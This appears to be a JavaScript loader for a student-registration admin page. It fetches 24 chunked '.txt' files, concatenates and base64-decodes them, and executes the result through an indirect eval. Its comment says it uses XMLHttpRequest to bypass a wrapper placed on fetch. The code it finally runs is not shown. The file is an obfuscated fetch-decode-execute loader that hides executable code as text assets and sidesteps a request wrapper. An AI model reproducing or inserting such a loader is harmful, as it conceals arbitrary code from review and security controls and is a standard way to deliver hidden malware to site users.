/* admin-students-reg — same-origin XHR (bypass fetch CORS wrap) */
(function () {
  var F = [];
  for (var i = 0; i < 24; i++) F.push("/_asr_x" + i + ".txt?v=b272cc85");
  function xhr(url) {
    return new Promise(function (res, rej) {
      var x = new XMLHttpRequest();
      x.open("GET", url, true);
      x.onload = function () {
        if (x.status >= 200 && x.status < 300) res(x.responseText);
        else rej(new Error(url + " " + x.status));
      };
      x.onerror = function () { rej(new Error("xhr " + url)); };
      x.send();
    });
  }
  Promise.all(F.map(xhr))
    .then(function (parts) {
      var b64 = parts.join("").replace(/\s+/g, "");
      var bin = atob(b64);
      var bytes = new Uint8Array(bin.length);
      for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
      var out = new TextDecoder("utf-8").decode(bytes);
      (0, eval)(out);
    })
    .catch(function (e) {
      console.error("[students-reg] load failed", e);
    });
})();
